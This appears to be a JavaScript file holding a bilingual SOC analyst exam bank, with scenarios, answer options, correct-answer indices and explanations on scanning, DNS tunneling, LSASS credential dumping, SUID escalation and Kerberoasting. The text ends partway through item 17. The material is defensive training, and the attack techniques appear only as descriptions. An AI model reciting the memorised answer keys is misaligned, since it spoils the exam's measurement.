// BCSA Master Final Examination Bank - 35 Comprehensive SOC Scenarios (Bilingual: AR & EN)
// Structured strictly according to PRD Phase 2 specifications:
// Questions 1-8:   SOC Fundamentals, Networking, Ports, Protocols (DNS, HTTP, ARP, TCP Flags), OSI
// Questions 9-15:  Windows Internals (svchost, lsass), Linux CLI, Active Directory (Kerberos, NTLM, GPO)
// Questions 16-23: Windows Event IDs (4624, 4625, 4688, 4720, 7045, 1102), Sysmon (1, 3, 10, 11, 22), Wireshark, Snort/Suricata
// Questions 24-30: Frameworks (MITRE ATT&CK, Cyber Kill Chain), OSINT, EDR, SIEM Queries (Splunk SPL / Wazuh)
// Questions 31-35: Practical Alert Triage (TP vs FP) & Incident Response Playbooks (Phishing, Ransomware)

const finalExamQuestions = [
  // --- DOMAIN 1: SOC & NETWORKING FUNDAMENTALS (Q1 to Q8) ---
  {
    id: 1,
    domain: "أساسيات الـ SOC والشبكات",
    domainEn: "SOC & Networking Fundamentals",
    topic: "TCP Handshake & Port Scanning",
    scenario: "أثناء فحص حركة المرور عبر Wireshark، لاحظت تدفقاً لآلاف الحزم المتجهة للمنفذ 445، حيث يرسل المصدر حزم SYN، وبمجرد استلام SYN-ACK من الهدف يرسل فوراً حزمة RST دون إرسال ACK.",
    scenarioEn: "While analyzing network traffic in Wireshark, you observe thousands of packets destined for port 445 where the source transmits SYN packets, and immediately upon receiving SYN-ACK from the target, replies with RST instead of completing with ACK.",
    question: "ما نوع هذا النشاط وما هو الهدف التكتيكي منه؟",
    questionEn: "What type of activity is this, and what is the tactical objective?",
    options: [
      "فحص منافذ خفي TCP SYN Stealth Scan (Half-Open) لمعرفة المنافذ المفتوحة دون إكمال الجلسة وتفادي التسجيل الكامل في التطبيقات.",
      "نقل ملفات نظام مشروع عبر بروتوكول مشاركة الملفات SMB.",
      "هجوم حجب خدمة DoS يستهدف تعطيل خادم الـ DNS المحلي.",
      "تجديد تلقائي لعنوان الـ IP عبر بروتوكول DHCP DORA."
    ],
    optionsEn: [
      "TCP SYN Stealth Scan (Half-Open) to identify open listening ports without completing the 3-way handshake and avoiding full application logging.",
      "Legitimate enterprise file transfer using SMB file sharing.",
      "A Denial of Service (DoS) attack designed to crash the local DNS resolver.",
      "An automated IP lease renewal via the DHCP DORA process."
    ],
    correct: 0,
    explanation: "فحص SYN Stealth Scan يرسل حزمة SYN، فإذا رد الهدف بـ SYN-ACK، يعلم المهاجم أن المنفذ مفتوح ويرسل RST فوراً لقطع الاتصال دون إكمال المصافحة الثلاثية لتجنب إنشاء جلسة تطبيقية رسمية.",
    explanationEn: "A SYN Stealth Scan transmits a SYN packet. If the target replies with SYN-ACK, the port is identified as open, and the scanner immediately sends a RST packet to tear down the connection before the application session logs the event."
  },
  {
    id: 2,
    domain: "أساسيات الـ SOC والشبكات",
    domainEn: "SOC & Networking Fundamentals",
    topic: "DNS Tunneling & Data Exfiltration",
    scenario: "رصد محلل الـ SOC آلاف استعلامات الـ DNS المتكررة في الدقيقة الواحدة لنطاق فرعي غريب يتكون من نصوص عشوائية طويلة مثل: `aW5mb3JtYXRpb24=.data.attacker-c2.xyz` بنوع استعلام TXT.",
    scenarioEn: "A SOC analyst flags thousands of outbound DNS queries per minute for an unusual domain formatted with high-entropy Base64 strings: aW5mb3JtYXRpb24=.data.attacker-c2.xyz requesting TXT records.",
    question: "ما هو الهجوم الذي يجري تنفيذه وما الغرض منه؟",
    questionEn: "What attack is occurring and what is its primary goal?",
    options: [
      "تحديث طبيعي لكاش أسماء النطاقات في الشبكة المحلية.",
      "هجوم نفق الـ DNS (DNS Tunneling) لتهريب وسرقة بيانات حساسة مشفرة بـ Base64 عبر المنفذ 53 المسموح به في الجدار الناري.",
      "هجوم حجب الخدمة عبر تسميم بروتوكول ARP.",
      "محاولة تسجيل دخول فاشلة عبر بروتوكول SSH."
    ],
    optionsEn: [
      "Normal recursive DNS cache updating on the internal network.",
      "DNS Tunneling for data exfiltration, covertly funneling Base64 encoded sensitive data over outbound UDP port 53 permitted by the firewall.",
      "Layer 2 Denial of Service through ARP poisoning.",
      "Brute force SSH credential stuffing attempt."
    ],
    correct: 1,
    explanation: "تقنية DNS Tunneling تستغل بروتوكول DNS لنقل البيانات المسروقة مشفرة داخل أسماء النطاقات الفرعية لأن منافذ DNS 53 نادراً ما يتم حظرها بالجدران النارية.",
    explanationEn: "DNS Tunneling exploits UDP/TCP port 53 by encapsulating stolen data into DNS query labels and TXT records, easily bypassing egress firewalls that don't inspect deep DNS payloads."
  },
  {
    id: 3,
    domain: "أساسيات الـ SOC والشبكات",
    domainEn: "SOC & Networking Fundamentals",
    topic: "OSI Layer Attacks",
    scenario: "انقطعت حركة المرور فجأة عن مستخدم، وعند فحص جدول ARP في جهازه تبين أن عنوان الـ MAC المقترن بالبوابة الافتراضية (Default Gateway IP) قد تغير ليطابق عنوان MAC لحاسوب محمول يخص متدرباً جديداً في نفس الغرفة.",
    scenarioEn: "A workstation suddenly loses its standard route. An analyst inspects the local ARP cache and finds the Default Gateway IP is now bound to the MAC address of a rogue laptop on the same local subnet.",
    question: "في أي طبقة من طبقات نموذج OSI وقع هذا الهجوم وما اسمه؟",
    questionEn: "At which layer of the OSI model does this attack occur, and what is its name?",
    options: [
      "الطبقة السابعة (Application Layer) - هجوم حقن أوامر SQL.",
      "الطبقة الرابعة (Transport Layer) - هجوم SYN Flood.",
      "الطبقة الثانية (Data Link Layer) - هجوم تسميم الـ ARP (ARP Poisoning / MITM).",
      "الطبقة الثالثة (Network Layer) - هجوم Smurf ICMP."
    ],
    optionsEn: [
      "Layer 7 (Application) - SQL Injection attack.",
      "Layer 4 (Transport) - SYN Flood Denial of Service.",
      "Layer 2 (Data Link) - ARP Cache Poisoning / Man-in-the-Middle (MITM).",
      "Layer 3 (Network) - Smurf ICMP amplification."
    ],
    correct: 2,
    explanation: "بروتوكول ARP يعمل في الطبقة الثانية (Data Link Layer)، وهجوم ARP Poisoning يخدع أجهزة الشبكة ليرسل الترافيك لحاسوب المهاجم كـ Man-in-the-Middle.",
    explanationEn: "The Address Resolution Protocol operates at Layer 2 (Data Link). ARP spoofing sends gratuitous replies, deceiving hosts into routing traffic directly through the attacker's network adapter."
  },
  {
    id: 4,
    domain: "أساسيات الـ SOC والشبكات",
    domainEn: "SOC & Networking Fundamentals",
    topic: "TCP Flags Analysis",
    scenario: "وصلت حزمة TCP تحمل كلاً من الرايات (FIN, URG, PSH) مفعلة معاً في نفس الوقت، وهي توليفة لا تحدث في حركة المرور الطبيعية للإنترنت.",
    scenarioEn: "An intrusion detection system flags a TCP packet with FIN, URG, and PSH control flags set concurrently, an illegal flag combination that never occurs in normal network traffic.",
    question: "ما اسم هذا الفحص الاستطلاعي ولماذا يستخدمه المهاجم؟",
    questionEn: "What is this reconnaissance scan called and why is it used?",
    options: [
      "فحص شجرة عيد الميلاد (TCP Xmas Tree Scan) لتجاوز الجدران النارية التقليدية ومعرفة المنافذ المفتوحة بالاعتماد على طريقة رد نظام التشغيل (RFC 793).",
      "طلب إعادة توجيه طبيعي لحركة المرور عبر بروتوكول ICMP.",
      "جلسة نقل آمنة باستخدام مفاتيح SSH.",
      "فحص Ping عادي للتحقق من اتصال الجهاز بالإنترنت."
    ],
    optionsEn: [
      "TCP Xmas Tree Scan, lighting up the packet flags like a Christmas tree to bypass stateless firewalls and fingerprint OS responses (RFC 793).",
      "Legitimate ICMP redirect router advertisement.",
      "Encrypted terminal session using SSH keys.",
      "Standard ICMP Echo ping request to test network availability."
    ],
    correct: 0,
    explanation: "فحص Xmas يضيء رايات FIN/URG/PSH كشجرة عيد الميلاد؛ فإذا كان المنفذ مغلقاً يرسل الهدف RST، وإذا كان مفتوحاً يتجاهل الحزمة (في أنظمة Linux/BSD).",
    explanationEn: "Xmas scan lights up flags like an illuminated Christmas tree. RFC 793 dictates closed ports reply with RST, whereas open ports quietly drop the malformed packet on POSIX-compliant systems."
  },
  {
    id: 5,
    domain: "أساسيات الـ SOC والشبكات",
    domainEn: "SOC & Networking Fundamentals",
    topic: "Cleartext Protocols & Packet Analysis",
    scenario: "قام محلل الـ SOC بفتح ملف PCAP تم التقاطه لحركة مرور متجهة للمنفذ 80، ولاحظ طلباً من نوع HTTP POST يتبعه نص صريح يحتوي على: `username=admin&password=SuperSecret2026!`.",
    scenarioEn: "Analyzing a suspicious PCAP capture over port 80, a SOC analyst spots an unencrypted HTTP POST request containing: username=admin&password=SuperSecret2026! in cleartext.",
    question: "ما هو الخطر الأمني الجوهري هنا وما التوصية الفورية لمعالجته؟",
    questionEn: "What is the primary security vulnerability and the immediate remediation?",
    options: [
      "استخدام بروتوكول HTTP غير المشفر ينقل البيانات الحساسة نصاً صريحاً يسهل التنصت عليه؛ يجب فرض التشفير الكامل عبر HTTPS (TLS 1.3) على المنفذ 443 وتفعيل سياسة HSTS.",
      "المنفذ 80 آمن تماماً ولا يتطلب أي تعديل لأن كلمات المرور محفوظة في الذاكرة.",
      "المشكلة في طول كلمة المرور ويجب تقليلها لتفادي التسريب.",
      "يجب استبدال خادم الويب بخادم بريد إلكتروني فوراً."
    ],
    optionsEn: [
      "Unencrypted HTTP transmits credentials in cleartext, enabling eavesdropping; immediate enforcement of HTTPS (TLS 1.3) on port 443 with HSTS is required.",
      "Port 80 is secure by default because strings reside temporarily in volatile RAM.",
      "The password length is excessive and should be shortened.",
      "The web server must be converted to an IMAP mail server immediately."
    ],
    correct: 0,
    explanation: "بروتوكول HTTP ينقل البيانات كنص صريح (Cleartext)؛ ولحماية بيانات الاعتماد من التنصت الشبكي (Sniffing) يجب الترقية إلى بروتوكول HTTPS المشفر.",
    explanationEn: "Cleartext HTTP exposes plain authentication credentials to anyone on the wire. Mandatory migration to HTTPS with TLS certificates and HSTS headers eliminates credential interception."
  },
  {
    id: 6,
    domain: "أساسيات الـ SOC والشبكات",
    domainEn: "SOC & Networking Fundamentals",
    topic: "Enterprise Directory Protocols",
    scenario: "في تدقيق أمني لشبكة البنك، رصدت اتصالات متكررة عبر المنفذ 389 لنقل بيانات الموظفين وصلاحياتهم بين أجهزة العملاء والـ Domain Controller.",
    scenarioEn: "During an enterprise perimeter audit, a SOC engineer identifies recurring network flows on TCP port 389 querying employee privileges against the central Domain Controller.",
    question: "ما هو هذا البروتوكول وما البديل المشفر الآمن الواجب استخدامه في بيئة الشركات؟",
    questionEn: "What protocol is operating on port 389 and what secure encrypted alternative must replace it?",
    options: [
      "بروتوكول LDAP غير المشفر؛ ويجب استبداله فوراً بـ LDAPS (LDAP over SSL/TLS) على المنفذ 636.",
      "بروتوكول RDP ويجب استبداله بـ Telnet على المنفذ 23.",
      "بروتوكول FTP ويجب استبداله بـ TFTP على المنفذ 69.",
      "بروتوكول NTP ويجب استبداله بـ SNMP على المنفذ 161."
    ],
    optionsEn: [
      "Unencrypted LDAP on TCP 389; it must be immediately upgraded to LDAPS (LDAP over SSL/TLS) on TCP 636.",
      "RDP protocol on TCP 389, which should be converted to Telnet on port 23.",
      "FTP file protocol, which should be shifted to TFTP on port 69.",
      "NTP clock synchronization, which should be mapped to SNMP on port 161."
    ],
    correct: 0,
    explanation: "المنفذ 389 يخص استعلامات LDAP غير المشفرة، مما يسمح للمهاجم بالتنصت على أسماء المستخدمين وهيكل الدومين؛ البديل الآمن هو LDAPS على المنفذ 636.",
    explanationEn: "Port 389 runs unencrypted Lightweight Directory Access Protocol (LDAP), allowing adversaries to capture domain queries and NTLM hashes. LDAPS on TCP 636 encrypts directory queries."
  },
  {
    id: 7,
    domain: "أساسيات الـ SOC والشبكات",
    domainEn: "SOC & Networking Fundamentals",
    topic: "HTTP Status Codes & Web Triage",
    scenario: "أثناء تحليل سجلات خادم الويب (Web Server Access Logs)، لاحظت تلقي مستخدم آلاف الردود بكود 403 Forbidden بعد محاولته طلب مسار `/admin/backup.zip`.",
    scenarioEn: "Reviewing web server reverse proxy logs, an analyst spots a remote IP receiving continuous 403 Forbidden responses after attempting to fetch /admin/backup.zip.",
    question: "ما الفرق الأمني الجوهري بين كود 401 Unauthorized وكود 403 Forbidden؟",
    questionEn: "What is the key security difference between HTTP 401 Unauthorized and HTTP 403 Forbidden?",
    options: [
      "كود 401 يعني أن المستخدم غير موثق الهوية ويحتاج لتسجيل الدخول (Missing Credentials)، بينما 403 يعني أن الخادم عرف هوية المستخدم ولكنه يرفض منحه الإذن بالوصول للملف لعدم كفاية صلاحياته.",
      "كود 403 يعني أن الصفحة غير موجودة على السيرفر أصلاً.",
      "كود 401 يعني نجاح العملية بالكامل وتنزيل الملف.",
      "كود 403 يعني انقطاع كابل الإنترنت في جهاز العميل."
    ],
    optionsEn: [
      "401 means the client is unauthenticated and must present valid credentials, whereas 403 confirms the identity is recognized but access is strictly forbidden by policy/permissions.",
      "403 indicates that the resource does not exist on the server (Not Found).",
      "401 indicates that the request succeeded and the file is actively downloading.",
      "403 signifies a physical hardware cable disconnection on the client host."
    ],
    correct: 0,
    explanation: "كود 401 يطلب إثبات الهوية (Authentication Required)، بينما 403 يفيد بأن الصلاحيات غير كافية للوصول (Authorization Refused) حتى لو كان المستخدم مسجلاً.",
    explanationEn: "HTTP 401 demands missing or invalid authentication credentials. HTTP 403 acknowledges who you are, but the web daemon refuses authorization based on Access Control Lists."
  },
  {
    id: 8,
    domain: "أساسيات الـ SOC والشبكات",
    domainEn: "SOC & Networking Fundamentals",
    topic: "DHCP Starvation & Network Hardening",
    scenario: "تعطلت شبكة المؤسسة فجأة ولم يعد بإمكان أي موظف الحصول على عنوان IP. كشف التحقيق أن جهازاً مجهولاً أرسل آلاف طلبات DHCP Discover بعناوين MAC مزيفة متتالية استهلكت جميع العناوين المتاحة في الـ Scope.",
    scenarioEn: "Enterprise staff report sudden network dropouts. Investigation reveals a rogue node blasted millions of DHCP Discover packets with randomized MAC addresses, depleting the entire IP lease pool.",
    question: "ما اسم هذا الهجوم وما هي التقنية الدفاعية على السويتش (Switch) لمنعه جذرياً؟",
    questionEn: "What is this attack and what switch-level mitigation prevents it?",
    options: [
      "هجوم استنزاف الـ DHCP (DHCP Starvation)؛ ويتم منعه بتفعيل خاصية DHCP Snooping وتحديد عدد عناوين MAC المسموح بها عبر Port Security.",
      "هجوم استغلال ثغرة القلب النازف Heartbleed في خوادم SSL.",
      "هجوم تزييف خوادم البريد الإلكتروني SPF Spoofing.",
      "هجوم حقن قواعد البيانات SQL Injection."
    ],
    optionsEn: [
      "DHCP Starvation attack; mitigated directly at Layer 2 access switches by enabling DHCP Snooping and Port Security MAC rate-limiting.",
      "Heartbleed memory leak exploitation against OpenSSL daemons.",
      "SPF header forgery in corporate mail transfer agents.",
      "Blind SQL Injection through a client database proxy."
    ],
    correct: 0,
    explanation: "هجوم DHCP Starvation يستنفذ عناوين السيرفر بحزم Discover وهمية؛ وتفعيل خاصية DHCP Snooping و Port Security يمنع هذا التلاعب من جذوره.",
    explanationEn: "DHCP Starvation exhausts the IP pool using bogus hardware MAC addresses. Enabling DHCP Snooping establishes trusted uplink ports, while Port Security drops unauthorized MAC mutations."
  },

  // --- DOMAIN 2: OS INTERNALS & ACTIVE DIRECTORY (Q9 to Q15) ---
  {
    id: 9,
    domain: "أنظمة التشغيل والدليل النشط",
    domainEn: "OS Internals & Active Directory",
    topic: "Windows Core Processes & Masquerading",
    scenario: "فحص محلل الـ SOC قائمة العمليات النشطة في محطة عمل ووجد عملية باسم `svchost.exe` تعمل من المسار `C:\\Users\\Finance\\AppData\\Roaming\\svchost.exe` وتخضع لعملية أب اسمها `WINWORD.EXE`.",
    scenarioEn: "A SOC analyst inspects process trees and flags an instance of svchost.exe running from C:\\Users\\Finance\\AppData\\Roaming\\svchost.exe spawned by parent WINWORD.EXE.",
    question: "هل هذه العملية شرعية أم خبيثة، وما هي المعايير التي تؤكد حكمك؟",
    questionEn: "Is this process benign or malicious, and which forensic indicators prove it?",
    options: [
      "خبيثة بشكل قاطع؛ لأن عملية svchost.exe الشرعية تنطلق حصراً من مسار `C:\\Windows\\System32` وتكون تابعة حصراً لعملية الأب `services.exe` وتعمل بحسابات النظام (SYSTEM أو Network/Local Service) وليس حساب مستخدم عادي.",
      "عملية شرعية تماماً لأن شركة مايكروسوفت تسمح بتشغيل svchost من أي مجلد.",
      "عملية شرعية تابعة لبرنامج وورد لتحديث القواميس.",
      "لا يمكن تحديد طبيعتها إلا بعد إعادة تشغيل الجهاز 5 مرات."
    ],
    optionsEn: [
      "Decisively malicious (Process Masquerading T1036); legitimate svchost.exe runs exclusively from C:\\Windows\\System32, spawned strictly by services.exe under SYSTEM/NetworkService.",
      "Completely legitimate because Windows permits services to instantiate from user profile paths.",
      "A benign Word helper sub-process responsible for grammar checking.",
      "Cannot be determined without executing five consecutive system reboots."
    ],
    correct: 0,
    explanation: "المسار الشرعي الوحيد لـ svchost هو System32 وأبوه الحصري هو services.exe؛ وانطلاقه من مسار مستخدم أو من تطبيق كـ Word دليل قاطع على برمجية خبيثة تتخفى باسم النظام.",
    explanationEn: "Legitimate svchost instances reside solely in System32 and are spawned strictly by services.exe (-k argument). Execution from user AppData under Word confirms weaponized macro injection."
  },
  {
    id: 10,
    domain: "أنظمة التشغيل والدليل النشط",
    domainEn: "OS Internals & Active Directory",
    topic: "LSASS Memory Dumping & Credential Dumping",
    scenario: "رصد نظام الكشف تنبيهاً أمنياً يشير إلى قيام أداة مشبوهة بطلب تصريح وصول `PROCESS_VM_READ` لعملية `lsass.exe` عبر نداء برمجي (MiniDumpWriteDump).",
    scenarioEn: "Endpoint telemetry triggers a critical alert: an unapproved executable opened a handle to lsass.exe requesting PROCESS_VM_READ access and invoked MiniDumpWriteDump.",
    question: "ما هو الهدف التكتيكي للمهاجم وما الأداة الشهيرة المستخدمة في هذا الهجوم؟",
    questionEn: "What is the attacker's tactical objective and what notorious tool performs this technique?",
    options: [
      "تفريغ ذاكرة خدمة التوثيق LSASS لسرقة كلمات المرور الصريحة وهاشات NTLM وتذاكر Kerberos؛ باستخدام أدوات مثل Mimikatz أو ProcDump.",
      "تحسين سرعة إقلاع نظام ويندوز وتنظيف الذاكرة العشوائية.",
      "فحص الجهاز للبحث عن أخطاء في القرص الصلب عبر chkdsk.",
      "تحديث متصفح إيدج تلقائياً."
    ],
    optionsEn: [
      "Dumping LSASS memory (T1003.001) to steal plaintext passwords, NTLM hashes, and Kerberos tickets, characteristic of tools like Mimikatz or ProcDump.",
      "Optimizing memory heap allocation to accelerate system boot time.",
      "Scanning the hard drive for sector errors via chkdsk.",
      "Performing background Microsoft Edge browser updates."
    ],
    correct: 0,
    explanation: "عملية lsass.exe تحتفظ ببيانات تسجيل الدخول وتذاكر كيربيروس؛ وسحب الذاكرة عبر MiniDumpWriteDump أو Mimikatz هو أشهر أسلوب لسرقة هويات المستخدمين.",
    explanationEn: "The Local Security Authority Subsystem Service (lsass.exe) caches active credentials. Memory dumps via MiniDumpWriteDump expose plaintext secrets and NTLM password hashes."
  },
  {
    id: 11,
    domain: "أنظمة التشغيل والدليل النشط",
    domainEn: "OS Internals & Active Directory",
    topic: "Windows Persistence Mechanisms",
    scenario: "أثناء التحقيق الجنائي في جهاز مخترق، عثر المحلل على قيمة جديدة في مسار الريجستري: `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` تشير إلى سكربت PowerShell يقوم بتحميل كود خبيث عند كل تسجيل دخول.",
    scenarioEn: "During an endpoint forensic triage, an analyst identifies a newly created key inside HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to an encoded PowerShell payload.",
    question: "ما هو التكتيك الأمني المتبع من قبل المهاجم في مصفوفة MITRE ATT&CK؟",
    questionEn: "Which MITRE ATT&CK tactic does this technique represent?",
    options: [
      "تكتيك البقاء والاستمرار (Persistence - T1547.001) لضمان إعادة تشغيل البايلود الخبيث تلقائياً حتى بعد إعادة تشغيل الجهاز.",
      "تكتيك الاستطلاع الأولي (Reconnaissance).",
      "تكتيك مسح الأدلة الجنائية (Defense Evasion).",
      "تكتيك نقل البيانات المسروقة (Exfiltration)."
    ],
    optionsEn: [
      "Persistence (T1547.001: Registry Run Keys / Startup Folder), ensuring automatic payload re-execution across system reboots and logons.",
      "Reconnaissance (TA0043: Active Scanning).",
      "Defense Evasion (TA0005: Indicator Removal).",
      "Exfiltration (TA0010: Automated Exfiltration)."
    ],
    correct: 0,
    explanation: "مفاتيح Run و RunOnce في الريجستري تُستخدم بشكل أساسي لتثبيت بقاء المهاجم في النظام (Persistence) وإعادة تشغيل برمجياته الخبيثة تلقائياً مع بدء التشغيل.",
    explanationEn: "Registry Run and RunOnce hives represent classic persistence vectors. Malicious executables registered here automatically launch each time the authenticated user logs in."
  },
  {
    id: 12,
    domain: "أنظمة التشغيل والدليل النشط",
    domainEn: "OS Internals & Active Directory",
    topic: "Linux Authentication Architecture",
    scenario: "تمكن مهاجم من قراءة ملفين في خادم لينكس: الملف الأول `/etc/passwd` والملف الثاني `/etc/shadow`.",
    scenarioEn: "An adversary achieves local file read on an Ubuntu server, extracting both /etc/passwd and /etc/shadow.",
    question: "ما الفرق الأمني الحاسم بين الملفين، وأين توجد هاشات كلمات المرور المشفرة؟",
    questionEn: "What is the critical security difference between these files, and where do password hashes reside?",
    options: [
      "ملف `/etc/passwd` متاح للقراءة لجميع المستخدمين ويحتوي على بيانات الحسابات ومجلداتها، بينما ملف `/etc/shadow` لا يمكن قراءته إلا بصلاحيات root ويحتوي على هاشات كلمات المرور الفعلية المشفرة.",
      "ملف `/etc/passwd` هو من يحتوي على كلمات المرور الصريحة و `/etc/shadow` يحتوي على أسماء الطابعات.",
      "الملفان متطابقان تماماً ولا يوجد أي فرق بينهما.",
      "ملف `/etc/shadow` يحتوي فقط على صور المستخدمين الرمزية."
    ],
    optionsEn: [
      "/etc/passwd is globally world-readable containing UID, GID, shell, and home paths, whereas /etc/shadow is restricted strictly to root and holds the salted cryptographic password hashes.",
      "/etc/passwd contains plaintext passwords and /etc/shadow contains network printer spoolers.",
      "Both files are identical mirror copies maintained for high availability.",
      "/etc/shadow stores only user avatar graphics and desktop wallpaper settings."
    ],
    correct: 0,
    explanation: "في أنظمة لينكس، تم عزل الهاشات داخل `/etc/shadow` المقتصر على الـ root لمنع أي مستخدم عادي من نسخ الهاشات وكسرها عبر برامج التخمين مثل John the Ripper.",
    explanationEn: "Modern Linux restricts access to /etc/shadow (permissions 0640/0000 root:shadow) to prevent unprivileged users from extracting password hashes for offline cracking with Hashcat."
  },
  {
    id: 13,
    domain: "أنظمة التشغيل والدليل النشط",
    domainEn: "OS Internals & Active Directory",
    topic: "Linux Privilege Escalation via SUID",
    scenario: "أثناء تدقيق خادم لينكس، وجد المحلل ملفاً تنفيذياً يملك صلاحية `rwsr-xr-x` برقم صلاحيات (4755) وتملكه الـ `root`.",
    scenarioEn: "Inspecting permission bits on an enterprise Linux gateway, an analyst discovers a binary configured with rwsr-xr-x (mode 4755) owned by root.",
    question: "ماذا تعني خانة الـ `s` (SUID Bit)، وما الخطر الأمني إذا كانت الأداة تسمح بتنفيذ الأوامر (مثل find أو vim أو bash)؟",
    questionEn: "What does the 's' bit (SetUID) represent, and what is the severe security risk if assigned to interpreters like find or vim?",
    options: [
      "تعني أن أي مستخدم يشغل الملف سينفذه بصلاحيات مالكه (وهو root)، وإذا كانت الأداة تقبل تمرير أوامر فستتيح للمستخدم العادي ترقية صلاحياته فوراً إلى Root Shell (Privilege Escalation).",
      "تعني أن الملف محذوف وموجود في سلة المهملات.",
      "تعني أن الملف مخصص للقراءة فقط ولا يمكن تشغيله أبداً.",
      "تعني أن الأداة تحتاج للاتصال بالإنترنت قبل التشغيل."
    ],
    optionsEn: [
      "SetUID executes the binary with the effective privileges of the file owner (root); if misconfigured on utilities supporting shell escapes, unprivileged users achieve instant root elevation (GTFOBins).",
      "Signifies that the file was deleted and resides inside the system trash recycle folder.",
      "Indicates that the binary is read-only and cannot be executed.",
      "Requires an external WAN connection before executing."
    ],
    correct: 0,
    explanation: "صلاحية SUID تجعل الملف ينطلق بصلاحية مالكه (root)؛ واستغلال أدوات تقبل تشغيل أوامر فرعية يسمح للمهاجم بفتح Root Shell فوراً.",
    explanationEn: "SUID permission (mode 4000) causes an executable to run with owner privileges. Dangerous binaries (GTFOBins) such as nmap, vim, or find can easily spawn an interactive root shell."
  },
  {
    id: 14,
    domain: "أنظمة التشغيل والدليل النشط",
    domainEn: "OS Internals & Active Directory",
    topic: "Active Directory Kerberos Authentication",
    scenario: "قام موظف بتسجيل الدخول لحاسوبه في الدومين، فأرسل جهازه طلب AS-REQ إلى الـ KDC وتلقى رداً يحتوي على تذكرة مشفرة بمفتاح خادم الـ krbtgt.",
    scenarioEn: "A domain employee logs into their workstation. The host submits an AS-REQ to the Key Distribution Center (KDC) and receives a ticket encrypted with the krbtgt account hash.",
    question: "ما اسم هذه التذكرة وما هي وظيفتها في دورة مصادقة Kerberos؟",
    questionEn: "What is this ticket called and what is its role in the Kerberos authentication cycle?",
    options: [
      "تذكرة منح التذاكر (TGT - Ticket Granting Ticket)؛ وتُستخدم كإثبات هوية موثوق لطلب تذاكر الخدمات اللاحقة (TGS) دون الحاجة لإعادة إدخال كلمة المرور.",
      "تذكرة الخدمة النهائية (Service Ticket TGS).",
      "مفتاح التشفير العام لبروتوكول HTTPS.",
      "شهادة رقمية موقعة لفك تشفير رسائل البريد الإلكتروني."
    ],
    optionsEn: [
      "Ticket Granting Ticket (TGT); it acts as authenticated cryptographic proof of identity used to request downstream Service Tickets (TGS) without re-entering credentials.",
      "Final Service Ticket (TGS).",
      "Public SSL key for HTTPS validation.",
      "Digital S/MIME certificate for decrypting email traffic."
    ],
    correct: 0,
    explanation: "تذكرة TGT تصدر من KDC مشفرة بـ krbtgt، ويستخدمها العميل لطلب تذاكر الوصول للخدمات TGS داخل بيئة الدليل النشط دون إرسال كلمة المرور مجدداً.",
    explanationEn: "The Authentication Service issues a Ticket Granting Ticket (TGT) encrypted with the KDC's krbtgt secret key. The user presents this TGT to the TGS service to access network shares and databases."
  },
  {
    id: 15,
    domain: "أنظمة التشغيل والدليل النشط",
    domainEn: "OS Internals & Active Directory",
    topic: "Kerberoasting Attack & Detection",
    scenario: "رصد الـ SIEM طلباً مشبوهاً صادراً من حساب مستخدم عادي يطلب تذكرة خدمة TGS لحساب خدمة يملك SPN مسجل، وكان نوع التشفير المطلوب قديماً وهو RC4 (كود 0x17).",
    scenarioEn: "SIEM detects an unprivileged domain account requesting Kerberos TGS service tickets for multiple registered SPNs, deliberately demanding legacy RC4 (0x17) encryption.",
    question: "ما اسم هذا الهجوم وكيف يستفيد منه المهاجم خارج الشبكة؟",
    questionEn: "What is this attack called and how does the adversary exploit it offline?",
    options: [
      "هجوم Kerberoasting؛ حيث يحصل المهاجم على تذكرة الخدمة TGS المشفرة بهاش كلمة مرور حساب الخدمة، ثم يقوم بتصديرها خارجياً وكسرها بدون إنترنت عبر Hashcat.",
      "هجوم حجب الخدمة على خادم الدومين.",
      "هجوم تجاوز سعة الذاكرة في خادم الملفات.",
      "تحديث طبيعي لكلمات مرور موظفي الشركة."
    ],
    optionsEn: [
      "Kerberoasting (T1558.003); the attacker requests valid TGS tickets encrypted with the service account password hash, exfiltrating them for offline GPU brute-forcing via Hashcat.",
      "Denial of Service against Domain Controllers.",
      "Buffer overflow vulnerability in SMB file services.",
      "Routine automated password rotation initiated by Microsoft LAPS."
    ],
    correct: 0,
    explanation: "هجوم Kerberoasting يطلب تذاكر TGS لحسابات الـ SPN المشفرة بكلمة سر الخدمة، ثم يقوم بكسرها بدون إنترنت (Offline Brute-Force) لاكتشاف كلمة السر.",
    explanationEn: "In Kerberoasting, any valid domain user requests TGS tickets for Service Principal Names. Because tickets are encrypted with the target service account's NTLM hash, attackers crack them offline."
  },

  // --- DOMAIN 3: LOGS, SYSMON & NETWORK TELEMETRY (Q16 to Q23) ---
  {
    id: 16,
    domain: "السجلات، Sysmon، والشبكات",
    domainEn: "Logs, Sysmon & Network Telemetry",
    topic: "Windows Security Event ID 4624",
    scenario: "فحص المحلل حدث تسجيل دخول ناجح برقم Event ID 4624 على خادم قاعدة بيانات الشركة، ووجد أن حقل Logon Type يحمل القيمة `10`.",
    scenarioEn: "Investigating an off-hours authentication on a database server (Event ID 4624: An account was successfully logged on), the analyst notices Logon Type equals 10.",
    question: "ماذا يعني Logon Type 10 في سجلات ويندوز الأمنية؟",
    questionEn: "What does Logon Type 10 indicate in Windows Security Event logs?",
    options: [
      "تسجيل دخول تفاعلي عن بُعد عبر سطح المكتب البعيد (Remote Desktop / RDP / Terminal Services).",
      "تسجيل دخول تفاعلي مباشر عبر لوحة المفاتيح والشاشة الفيزيائية للجهاز (Logon Type 2).",
      "تسجيل دخول عبر الشبكة لمشاركة الملفات SMB (Logon Type 3).",
      "تسجيل دخول كخدمة نظام داخلية (Logon Type 5)."
    ],
    optionsEn: [
      "RemoteInteractive logon via Remote Desktop Protocol (RDP / Terminal Services).",
      "Interactive direct physical console logon at keyboard/display (Logon Type 2).",
      "Network logon accessing network shares or SMB printers (Logon Type 3).",
      "Service logon executed by internal Windows service daemons (Logon Type 5)."
    ],
    correct: 0,
    explanation: "Logon Type 10 يمثل حصراً جلسات الدخول عبر بروتوكول Remote Desktop (RDP)؛ وهو مؤشر حاسم للتحقق من الاتصالات الخارجية والمشبوهة.",
    explanationEn: "Windows Logon Type 10 explicitly denotes RemoteInteractive sessions (RDP/Terminal Server), critical for investigating lateral movement or compromised remote credentials."
  },
  {
    id: 17,
    domain: "السجلات، Sysmon، والشبكات",
    domainEn: "Logs, Sysmon & Network Telemetry",
    topic: "Windows Security Event ID 4625 & Password Spray",
